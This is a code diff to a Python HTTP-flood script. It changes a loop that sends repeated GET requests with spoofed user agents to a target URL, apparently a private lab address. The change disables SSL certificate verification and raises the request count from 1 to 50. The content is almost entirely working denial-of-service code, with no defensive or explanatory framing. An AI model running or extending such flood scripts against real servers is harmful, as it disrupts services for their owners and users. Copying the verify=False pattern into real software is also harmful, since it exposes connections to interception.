@@ -27,7 +27,8 @@ def http_flood(target_url, num_of_requests):
     # Flood the webpage with requests
     for _ in range(num_of_requests):
         try:
-            send_request = requests.get(target_url, headers=user_agents)
+            # verify=False ensures that the SSL certificate verification for the HTTP requests is skipped
+            send_request = requests.get(target_url, headers=user_agents, verify=False)
             print(f"Request status: {send_request.status_code}")
             print()
         except Exception as e:
@@ -36,7 +37,7 @@ def http_flood(target_url, num_of_requests):
 
 if __name__ == "__main__":
     target_url = "https://10.0.2.15"
-    num_of_requests = 1
+    num_of_requests = 50
 
     print(f"Starting http flood, targeting {target_url}")
 
